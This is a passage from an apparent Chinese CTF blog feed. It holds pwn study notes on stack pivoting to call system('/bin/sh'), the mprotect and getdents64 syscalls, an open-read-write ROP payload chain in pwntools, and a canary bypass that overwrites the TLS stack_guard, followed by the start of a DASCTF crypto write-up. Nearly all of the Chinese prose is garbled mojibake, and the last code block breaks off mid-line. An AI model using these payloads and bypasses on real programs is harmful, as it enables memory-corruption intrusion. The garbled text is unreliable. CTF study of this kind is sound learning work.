eip+4</code>å°†è°ƒç”¨è¯­å¥çš„ä¸‹ä¸€æ¡è¯­å¥ä¿å­˜åˆ°æ ˆä¸Šï¼Œç”¨æ¥åœ¨å‡½æ•°è¿”å›æ—¶è·³è½¬åˆ°è¿”å›åœ°å€ï¼ˆ<code>ret</code>ï¼‰</li><li>PCæŒ‡å‘<code>func</code>å‡½æ•°çš„åœ°å€</li></ul><p>åœ¨æ‰§è¡Œ<code>func</code>å‡½æ•°å‰ï¼š</p><ul><li><code>func</code>ä¼šå…ˆå°†<code>ebp</code>å¯„å­˜å™¨ä¸­çš„å€¼ä¿å­˜åˆ°æ ˆä¸Šï¼Œç”¨äºåœ¨å‡½æ•°è¿”å›æ—¶è¿˜åŸ<code>ebp</code>ä¸ºä¸»è°ƒå‡½æ•°çš„æ ˆåº•ã€‚</li></ul><p>å‡½æ•°æ‰§è¡Œå®Œæ¯•ï¼Œè¿”å›ï¼Œä¼šæ‰§è¡Œ<code>leave</code> <code>ret</code>è¿™ä¸¤æ¡è¯­å¥</p><ul><li><code>leave</code>ç›¸å½“äº<code>mov esp,ebp</code>ï¼ˆæŠŠæ ˆæŒ‡é’ˆæŒ‡å‘æ ˆåº•ï¼Œé”€æ¯æ ˆå¸§ï¼‰ã€<code>pop ebp</code>ï¼ˆè¿˜åŸ<code>ebp</code>ä¸ºä¸»è°ƒå‡½æ•°çš„æ ˆåº•ï¼‰ã€‚</li><li><code>ret</code>ç›¸å½“äº<code>pop eip</code>ï¼ˆæŠŠæ ˆä¸Šä¿å­˜çš„è¿”å›åœ°å€å­˜å…¥eipå¯„å­˜å™¨ï¼‰</li></ul><p>ä»è¿™é‡Œå¯ä»¥çŸ¥é“ï¼Œebpçš„å€¼å¯ä»¥æ§åˆ¶espï¼Œä½†æ˜¯<code>leave</code>æŒ‡ä»¤æ˜¯å…ˆ<code>mov esp,ebp</code>å<code>pop ebp</code>ï¼Œçœ‹ä¸Šå»æ²¡æœ‰åŠæ³•é€šè¿‡ä¿®æ”¹æ ˆä¸Šä¿å­˜çš„<code>ebp</code>æ”¹å˜espçš„å€¼ï¼Œä¸è¿‡ä¸è¦å¿˜è®°æˆ‘ä»¬è¿˜å¯ä»¥æ§åˆ¶<code>ret</code>çš„å€¼ï¼Œå¦‚æœæŠŠ<code>ret</code>è¦†ç›–ä¸º<code>leave ret</code>çš„åœ°å€ï¼Œæˆ‘ä»¬è¦†ç›–çš„å‡<code>ebp</code>å°±å¯ä»¥é€šè¿‡ä¸¤æ¬¡<code>leave</code>è¯­å¥åˆ°espå¯„å­˜å™¨ä¸Šï¼Œä»è€Œå®Œæˆäº†æ ˆè¿ç§»ã€‚</p><p><strong>æ€è·¯ï¼š</strong></p><p>åˆ©ç”¨ç¬¬ä¸€æ¬¡è¾“å…¥æ³„éœ²å‡ºebpåœ°å€ï¼Œå†åˆ©ç”¨ç¬¬äºŒæ¬¡è¾“å…¥æ„é€ ä¸€ä¸ªæ ˆï¼Œå°†espåŠ«æŒåˆ°æˆ‘ä»¬æ„é€ çš„æ ˆä¸Šï¼Œå†æŠŠæ ˆä¸Šçš„è¿”å›åœ°å€æ”¹ä¸º<code>system</code>å‡½æ•°çš„åœ°å€ï¼Œè¿™æ ·å°±æ¨¡æ‹Ÿå‡ºäº†ä¸€æ¬¡<code>system(&quot;/bin/sh&quot;)</code>çš„è°ƒç”¨ã€‚</p><p>å‚è€ƒï¼š</p><p>ciscn_2019_es_2</p><p>â€‹    </p><h4 id="ç‰¹æ®Šç³»ç»Ÿè°ƒç”¨"><a href="#ç‰¹æ®Šç³»ç»Ÿè°ƒç”¨" class="headerlink" title="ç‰¹æ®Šç³»ç»Ÿè°ƒç”¨"></a>ç‰¹æ®Šç³»ç»Ÿè°ƒç”¨</h4><h5 id="mprotect"><a href="#mprotect" class="headerlink" title="mprotect"></a>mprotect</h5><p>å°†å†…å­˜é¡µçš„æƒé™ä¿®æ”¹ä¸ºå¯è¯»å¯å†™å¯æ‰§è¡Œã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯æŒ‡å®šçš„å†…å­˜åŒºé—´å¿…é¡»åŒ…å«æ•´ä¸ªå†…å­˜é¡µï¼ˆ4Kï¼‰ã€‚åŒºé—´å¼€å§‹çš„åœ°å€startå¿…é¡»æ˜¯ä¸€ä¸ªå†…å­˜é¡µçš„èµ·å§‹åœ°å€ï¼Œå¹¶ä¸”åŒºé—´é•¿åº¦lenå¿…é¡»æ˜¯é¡µå¤§å°çš„æ•´æ•°å€ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mprotect</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot)</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">addrï¼šä¿®æ”¹ä¿æŠ¤å±æ€§åŒºåŸŸçš„èµ·å§‹åœ°å€ï¼Œaddrå¿…é¡»æ˜¯ä¸€ä¸ªå†…å­˜é¡µçš„èµ·å§‹åœ°å€ï¼Œç®€è€Œè¨€ä¹‹ä¸ºé¡µå¤§å°ï¼ˆä¸€èˆ¬æ˜¯ 4KB == 4096å­—èŠ‚ï¼‰æ•´æ•°å€ã€‚</span></span><br><span class="line"><span class="comment">lenï¼šè¢«ä¿®æ”¹ä¿æŠ¤å±æ€§åŒºåŸŸçš„é•¿åº¦,æœ€å¥½ä¸ºé¡µå¤§å°æ•´æ•°å€ã€‚ä¿®æ”¹åŒºåŸŸèŒƒå›´[addr, addr+len-1]ã€‚</span></span><br><span class="line"><span class="comment">protï¼šå¯ä»¥å–ä»¥ä¸‹å‡ ä¸ªå€¼ï¼Œå¹¶å¯ä»¥ç”¨â€œ|â€å°†å‡ ä¸ªå±æ€§ç»“åˆèµ·æ¥ä½¿ç”¨ï¼š</span></span><br><span class="line"><span class="comment">1ï¼‰PROT_READï¼šå†…å­˜æ®µå¯è¯»ï¼›</span></span><br><span class="line"><span class="comment">2ï¼‰PROT_WRITEï¼šå†…å­˜æ®µå¯å†™ï¼›</span></span><br><span class="line"><span class="comment">3ï¼‰PROT_EXECï¼šå†…å­˜æ®µå¯æ‰§è¡Œï¼›</span></span><br><span class="line"><span class="comment">4ï¼‰PROT_NONEï¼šå†…å­˜æ®µä¸å¯è®¿é—®ã€‚</span></span><br><span class="line"><span class="comment">è¿”å›å€¼ï¼š0ï¼›æˆåŠŸï¼Œ-1ï¼›å¤±è´¥ï¼ˆå¹¶ä¸”errnoè¢«è®¾ç½®ï¼‰</span></span><br><span class="line"><span class="comment">1ï¼‰EACCESï¼šæ— æ³•è®¾ç½®å†…å­˜æ®µçš„ä¿æŠ¤å±æ€§ã€‚å½“é€šè¿‡ mmap(2) æ˜ å°„ä¸€ä¸ªæ–‡ä»¶ä¸ºåªè¯»æƒé™æ—¶ï¼Œæ¥ç€ä½¿ç”¨ mprotect() æ ‡å¿—ä¸º PROT_WRITEè¿™ç§æƒ…å†µå°±ä¼šå‘ç”Ÿã€‚</span></span><br><span class="line"><span class="comment">2ï¼‰EINVALï¼šaddrä¸æ˜¯æœ‰æ•ˆæŒ‡é’ˆï¼Œæˆ–è€…ä¸æ˜¯ç³»ç»Ÿé¡µå¤§å°çš„å€æ•°ã€‚</span></span><br><span class="line"><span class="comment">3ï¼‰ENOMEMï¼šå†…æ ¸å†…éƒ¨çš„ç»“æ„ä½“æ— æ³•åˆ†é…ã€‚</span></span><br><span class="line"><span class="comment">è¿™é‡Œçš„å‚æ•°protï¼š</span></span><br><span class="line"><span class="comment">r:4</span></span><br><span class="line"><span class="comment">w:2</span></span><br><span class="line"><span class="comment">x:1</span></span><br><span class="line"><span class="comment">protä¸º7ï¼ˆ1+2+4ï¼‰å°±æ˜¯rwxå¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œä¸linuxæ–‡ä»¶å±æ€§ç”¨æ³•ç±»ä¼¼ã€‚ */</span></span><br></pre></td></tr></table></figure><h5 id="getdents64"><a href="#getdents64" class="headerlink" title="getdents64"></a>getdents64</h5><p>è¯»å–ç›®å½•ç»“æ„ã€‚</p><p><code>int getdents(unsigned int fd, struct linux_dirent *dirp,unsigned int count);</code></p><p>è¯¥å‡½æ•°æ˜¯ä¸€ä¸ªè§£ææ–‡ä»¶å¤¹çš„å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ—¶è¦è§£æçš„æ–‡ä»¶å¥æŸ„ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å­˜æ”¾è§£ææ•°æ®çš„ä½ç½®ï¼Œcountæ˜¯dirpçš„å¤§å°ï¼Œé€šè¿‡è¿™ä¸ªæˆ‘ä»¬å°±å¯ä»¥è§£ææ–‡ä»¶å¤¹ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯å½“æ‰“å¼€æ–‡ä»¶å¤¹æ—¶opençš„ç¬¬äºŒä¸ªå‚æ•°ä¸º0x10000,æ‰“å¼€æ–‡ä»¶æ—¶çš„å‚æ•°ä¸º0ã€‚</p><p>è¿”å›ç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">linux_dirent64</span> &#123;</span></span><br><span class="line">    <span class="keyword">ino64_t</span> d_ino; <span class="comment">/* 64-bit inode number */</span></span><br><span class="line">    <span class="keyword">off64_t</span> d_off; <span class="comment">/* 64-bit offset to next structure */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> d_reclen; <span class="comment">/* Size of this dirent */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> d_type; <span class="comment">/* File type */</span></span><br><span class="line">    <span class="keyword">char</span> d_name[]; <span class="comment">/* Filename (null-terminated) */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>â€‹    </p><h4 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h4><p>orw æ–¹å¼ï¼Œå³ open-read-writeï¼Œé€šè¿‡æ–‡ä»¶æ“ä½œç›´æ¥è·å–æ–‡ä»¶å†…å®¹ã€‚</p><p><strong>æŸ¥æ‰¾ <code>syscall; ret</code> çš„ gadgetæ–¹æ³•</strong></p><ol><li><p>ç”¨ opcode åŠŸèƒ½æœ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(asm(<span class="string">&#x27;syscall;ret&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"><span class="comment"># 0f05c3</span></span><br></pre></td></tr></table></figure></li><li><p>ROPgadgetæœç´¢</p><p><code>ROPgadget --binary libc-2.31.so --opcode 0f05c3</code></p></li></ol><p><strong>open</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># open(&quot;.&quot;)</span></span><br><span class="line">payload += p64(pop_rax_ret)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(bss_addr)</span><br><span class="line">payload += p64(pop_rsi_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_r12_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br></pre></td></tr></table></figure><p><strong>read</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># read(0, bss_addr, 2)</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret)</span><br><span class="line">payload += p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_r12_ret)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(elf.sym[<span class="string">&#x27;read&#x27;</span>])</span><br></pre></td></tr></table></figure><p><strong>write</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># write(1, bss_addr + 0x200, 0x600)</span></span><br><span class="line">payload += p64(pop_rax_ret)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_ret)</span><br><span class="line">payload += p64(bss_addr + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(pop_rdx_r12_ret)</span><br><span class="line">payload += p64(<span class="number">0x600</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="ä¿æŠ¤"><a href="#ä¿æŠ¤" class="headerlink" title="ä¿æŠ¤"></a>ä¿æŠ¤</h2><h3 id="ALSR"><a href="#ALSR" class="headerlink" title="ALSR"></a>ALSR</h3><p>ASLR çš„æ˜¯æ“ä½œç³»ç»Ÿçš„åŠŸèƒ½é€‰é¡¹ï¼Œä½œç”¨äº executableï¼ˆELFï¼‰è£…å…¥å†…å­˜è¿è¡Œæ—¶ï¼Œå› è€Œåªèƒ½éšæœºåŒ– stackã€heapã€libraries çš„åŸºå€ã€‚</p><p>â€‹    </p><h3 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h3><p>No-Executeï¼ˆä¸å¯æ‰§è¡Œï¼‰ï¼ŒNx çš„åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæ‰§è¡Œæµè¢«åŠ«æŒåˆ°æ ˆä¸Šæ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œå› ä¸ºæ•°æ®é¡µè¢«æ ‡è®°ä¸ºä¸å¯çŸ¥æ€§ï¼Œæ­¤æ—¶CPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œæ ˆä¸Šæ•°æ®ã€‚</p><p>â€‹    </p><h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><p>é‡‘ä¸é›€ä¿æŠ¤ï¼Œæ˜¯ä¸€ç§ç”¨æ¥é˜²æŠ¤æ ˆæº¢å‡ºçš„ä¿æŠ¤æœºåˆ¶ã€‚å…¶åŸç†æ˜¯åœ¨å‡½æ•°å…¥å£å¤„ï¼Œå…ˆä» fs/gs å¯„å­˜å™¨ä¸­å–å‡ºä¸€ä¸ª 4(eax)/8(rax) å­—èŠ‚çš„ cookie ä¿¡æ¯å­˜åˆ°æ ˆä¸Šï¼Œå½“å‡½æ•°ç»“æŸè¿”å›çš„æ—¶å€™ä¼šéªŒè¯ cookie ä¿¡æ¯æ˜¯å¦åˆæ³•(ä¸å¼€å§‹å­˜çš„æ˜¯å¦ä¸€è‡´)ï¼Œå¦‚æœä¸åˆæ³•å°±åœæ­¢ç¨‹åºè¿è¡Œã€‚çœŸæ­£çš„ cookie ä¿¡æ¯ä¹Ÿä¼šä¿å­˜åœ¨ç¨‹åºçš„æŸä¸ªä½ç½®ã€‚æ’å…¥æ ˆä¸­çš„ cookie ä¸€èˆ¬åœ¨ ebp / rbp ä¹‹ä¸Šçš„ä¸€ä¸ªå†…å­˜å•å…ƒä¿å­˜ã€‚</p><p><strong>æ”»å‡»</strong></p><h4 id="TLS"><a href="#TLS" class="headerlink" title="TLS"></a>TLS</h4><blockquote><p>çº¿ç¨‹å±€éƒ¨å­˜å‚¨ (TLS) æ˜¯ä¸€ç§å­˜å‚¨æŒç»­æœŸï¼ˆstorage durationï¼‰ï¼Œå¯¹è±¡çš„å­˜å‚¨æ˜¯åœ¨çº¿ç¨‹å¼€å§‹æ—¶åˆ†é…ï¼Œçº¿<br>ç¨‹ç»“æŸæ—¶å›æ”¶ï¼Œæ¯ä¸ªçº¿ç¨‹æœ‰è¯¥å¯¹è±¡è‡ªå·±çš„å®ä¾‹ã€‚</p></blockquote><p>TLS å…·æœ‰ TCB ç»“æ„ä½“ã€‚ä¹Ÿå°±æ˜¯è¯´å¯¹äº TLS çš„å˜é‡ï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½ä¼šæœ‰è‡ªå·±ç‹¬æœ‰çš„ä¸€ä»½ï¼Œæ—¢ç„¶ç»´æŠ¤ canary çš„ TCB ç»“æ„ä½“æ˜¯ TLS çš„ï¼Œå°±ä¸èƒ½æƒ³åˆ°è¿™ä¸ªç»“æ„ä½“å¿…ç„¶ä¼šåœ¨çº¿ç¨‹è‡ªå·±ç”³è¯·çš„ç©ºé—´é‡Œé¢ï¼Œå¹¶ä¸”åœ¨ä½œæ¯”è¾ƒæ—¶ä¹Ÿæ˜¯å’Œè‡ªå·±ç‹¬æœ‰çš„é‚£ä¸€ä»½æ¯”è¾ƒçš„ã€‚TCB ç»“æ„ä½“æ˜¯æ˜¯ä»¥ fs ä½œä¸ºåŸºå€ç´¢å¼•çš„ï¼ŒTCB ç»“æ„ä½“çš„å®šä¹‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *tcb;     <span class="comment">/* Pointer to the TCB. Not necessarily the</span></span><br><span class="line"><span class="comment">                      thread descriptor used by libpthread. */</span></span><br><span class="line">    <span class="keyword">dtv_t</span> *dtv;</span><br><span class="line">    <span class="keyword">void</span> *self;      <span class="comment">/* Pointer to the thread descriptor. */</span></span><br><span class="line">    <span class="keyword">int</span> multiple_threads;</span><br><span class="line">    <span class="keyword">int</span> gscope_flag;</span><br><span class="line">    <span class="keyword">uintptr_t</span> sysinfo;</span><br><span class="line">    <span class="keyword">uintptr_t</span> stack_guard;</span><br><span class="line">    <span class="keyword">uintptr_t</span> pointer_guard;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> vgetcpu_cache[<span class="number">2</span>];</span><br><span class="line">    <span class="comment">/* Bit 0: X86_FEATURE_1_IBT.</span></span><br><span class="line"><span class="comment">       Bit 1: X86_FEATURE_1_SHSTK.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> feature_1;</span><br><span class="line">    <span class="keyword">int</span> __glibc_unused1;</span><br><span class="line">    <span class="comment">/* Reservation of some values for the TM ABI. */</span></span><br><span class="line">    <span class="keyword">void</span> *__private_tm[<span class="number">4</span>];</span><br><span class="line">    <span class="comment">/* GCC split stack support. */</span></span><br><span class="line">    <span class="keyword">void</span> *__private_ss;</span><br><span class="line">    <span class="comment">/* The lowest address of shadow stack, */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> ssp_base;</span><br><span class="line">    <span class="comment">/* Must be kept even if it is no longer used by glibc since programs,</span></span><br><span class="line"><span class="comment">    like AddressSanitizer, depend on the size of tcbhead_t. */</span></span><br><span class="line">    __128bits __glibc_unused2[<span class="number">8</span>][<span class="number">4</span>] __attribute__ ((aligned (<span class="number">32</span>)));</span><br><span class="line">    <span class="keyword">void</span> *__padding[<span class="number">8</span>];</span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br></pre></td></tr></table></figure><p>åœ¨ gdb é‡Œé¢çœ‹ fs é™„è¿‘çš„å†…å­˜åˆ†å¸ƒæƒ…å†µï¼Œä½¿ç”¨ fsbase æŸ¥çœ‹ fs çš„å€¼ï¼Œå†…å­˜åˆ†å¸ƒå’Œç»“æ„ä½“å®šä¹‰ä¸€è‡´ï¼Œæ‰€ä»¥ fs å°±æ˜¯æŒ‡å‘ TCB ç»“æ„ä½“ï¼Œvmmap ä¸€ä¸‹ä¼šå‘ç° TCB æ˜¯å­˜åœ¨æ ˆä¸Šçš„ï¼Œè€Œä¸”æ˜¾ç„¶å»ºç«‹çš„æ—¶é—´åœ¨ test_thread ä¹‹å‰ï¼Œåˆç”±äºå¯ä»¥<strong>æ ˆæº¢å‡ºæ¥è¿‘ 0x1000 ä¸ªå­—èŠ‚</strong>ï¼Œå®Œå…¨å¯ä»¥<strong>è¦†å†™ TCB ç»“æ„ä½“</strong>ï¼ŒæŠŠ TCB çš„ stack_guard å­—æ®µå†™æˆæ¯”å¦‚ p64(0)ï¼Œé‚£ä¹ˆæº¢å‡ºåˆ° canary çš„æ—¶å€™è¦†å†™æˆ 0 å°±å¯ä»¥ bypass canaryã€‚</p><p>â€‹    </p><h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><p>PIEï¼ˆPosition Independent Executablesï¼‰æ˜¯ç¼–è¯‘å™¨ï¼ˆgccï¼Œâ€¦ï¼‰åŠŸèƒ½é€‰é¡¹ï¼ˆ-fPIE / -fpieï¼‰ï¼Œä½œç”¨äºç¼–è¯‘è¿‡ç¨‹ï¼Œå¯å°†å…¶ç†è§£ä¸ºç‰¹æ®Šçš„ PICï¼ˆsoä¸“ç”¨ï¼ŒPosition Independent Codeï¼‰ï¼ŒåŠ äº† PIE é€‰é¡¹ç¼–è¯‘å‡ºæ¥çš„ ELF ç”¨ file å‘½ä»¤æŸ¥çœ‹ä¼šæ˜¾ç¤ºå…¶ä¸º soï¼Œå…¶éšæœºåŒ–äº† ELF è£…è½½å†…å­˜çš„åŸºå€ï¼ˆä»£ç æ®µã€pltã€gotã€data ç­‰å…±åŒçš„åŸºå€ï¼‰ã€‚å…¶æ•ˆæœä¸ºç”¨ objdumpã€IDA åæ±‡ç¼–ä¹‹åçš„åœ°å€æ˜¯ç”¨åç§»è¡¨ç¤ºçš„è€Œä¸æ˜¯ç»å¯¹åœ°å€ã€‚</p><p>â€‹    </p><h2 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h2><p>ï¼ˆé¢„ç•™ï¼‰</p><p>â€‹    </p><h2 id="BROP"><a href="#BROP" class="headerlink" title="BROP"></a>BROP</h2><p>ï¼ˆé¢„ç•™ï¼‰</p><p>â€‹    </p><h3 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h3><h4 id="éšæœºæ•°ï¼ˆsrand-randï¼‰"><a href="#éšæœºæ•°ï¼ˆsrand-randï¼‰" class="headerlink" title="éšæœºæ•°ï¼ˆsrand+randï¼‰"></a>éšæœºæ•°ï¼ˆsrand+randï¼‰</h4><p><a href="https://www.mathstat.dal.ca/~selinger/random/">glibcéšæœºæ•°å‘ç”Ÿå™¨</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;h2 id=&quot;ROP&quot;&gt;&lt;a href=&quot;#ROP&quot; class=&quot;headerlink&quot; title=&quot;ROP&quot;&gt;&lt;/a&gt;ROP&lt;/h2&gt;&lt;p&gt;ROPï¼ˆReturn-Oriented Programming, è¿”å›å¯¼å‘ç¼–ç¨‹ï¼‰&lt;/p&gt;
&lt;p&gt;é€šè¿‡æ ˆæº¢å‡º</summary>
      
    
    
    
    <category term="pwn" scheme="https://lazzzaro.github.io/categories/pwn/"/>
    
    
    <category term="æ ˆ" scheme="https://lazzzaro.github.io/tags/%E6%A0%88/"/>
    
  </entry>
  
  <entry>
    <title>2021DASCTF July X CBCTF 4th</title>
    <link href="https://lazzzaro.github.io/2021/08/01/match-2021DASCTF-July-X-CBCTF-4th/"/>
    <id>https://lazzzaro.github.io/2021/08/01/match-2021DASCTF-July-X-CBCTF-4th/</id>
    <published>2021-08-01T10:13:02.000Z</published>
    <updated>2021-08-02T15:57:40.821Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p>2021 DASCTFå®æˆ˜ç²¾è‹±å¤ä»¤è¥é¢„çƒ­èµ›<br>DASCTF July x CBCTF 4th<br>ä¸»åŠå•ä½: å®‰æ’ä¿¡æ¯ã€æ­å·ç”µå­ç§‘æŠ€å¤§å­¦ç½‘ç»œç©ºé—´å®‰å…¨å­¦é™¢<br>ç«èµ›æ—¶é—´: 2021å¹´7æœˆ31æ—¥10:00- 2021å¹´8æœˆ1æ—¥18:00<br>æŠ¥åæ—¶é—´: 2021å¹´7æœˆ15æ—¥10:00-2021å¹´7æœˆ31æ—¥10:00<br>æŠ¥ååœ°å€: <a href="https://buuoj.cn/das">https://buuoj.cn/das</a><br>æŠ¥åæ–¹å¼: ç™»å½•åç‚¹å‡»[ä¸ªäººä¿¡æ¯]å®Œå–„ä¸ªäººä¿¡æ¯&gt;ç‚¹å‡»[å‚ä¸æƒ…å†µ]åˆ›å»ºæˆ˜é˜Ÿ-&gt;åˆ†äº«æˆ˜é˜ŸTokenç»™è‡ªå·±çš„é˜Ÿå‘˜-&gt;ç­‰å¾…æ¯”èµ›å¼€å§‹<br>ç«èµ›æ–¹å¼: å›¢é˜Ÿèµ›(æœ€å¤šä¸‰äººä¸€ç»„)<br>å‘½é¢˜æˆ˜é˜Ÿ: 0rays </p><p>Rank: 42</p><hr><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Yusaçš„å¯†ç å­¦ç­¾åˆ°â€”â€”BlockTrick"><a href="#Yusaçš„å¯†ç å­¦ç­¾åˆ°â€”â€”BlockTrick" class="headerlink" title="Yusaçš„å¯†ç å­¦ç­¾åˆ°â€”â€”BlockTrick"></a>Yusaçš„å¯†ç å­¦ç­¾åˆ°â€”â€”BlockTrick</h3><blockquote><p>å¥½ä¹…ä¸è§ï¼Œä¸Šè¯¾å‰å…ˆç­¾ä¸ªåˆ°å­ï¼æ­¤é¢˜ nc è¿æ¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">a</span>):</span></span><br><span class="line">size = (<span class="number">16</span>-<span class="built_in">len</span>(a)%<span class="number">16</span>)%<span class="number">16</span></span><br><span class="line">a += <span class="built_in">chr</span>(size)*size</span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">enc = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line"><span class="built_in">print</span>(iv.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span 